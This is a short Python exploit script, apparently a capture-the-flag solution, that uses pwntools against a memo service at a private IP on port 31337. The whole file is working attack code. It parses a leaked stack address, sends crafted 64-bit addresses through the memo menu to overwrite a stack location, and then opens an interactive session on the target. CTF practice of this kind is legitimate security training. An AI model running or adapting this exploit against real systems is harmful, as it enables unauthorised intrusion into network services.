from pwn import *
from PwnIOI import *
while 1:
	#s= IOI(['10.1.1.10',1234])
	s = IOI(['192.168.32.108', 31337])
	stack = int("7ffd"+s.read()[:-1],16)
	print hex(stack)
	s.write(p64(0x0400A56))
	s.read_until('input your content')
	s.write('1234')
	s.read_until('if you want to read your memo, press 1')
	s.write(p64(2))
	s.read_until('input your content')
	s.write(p64(stack-0x8))
	s.read_until('if you want to read your memo, press 1')
	s.write(p32(1))
	s.interact()
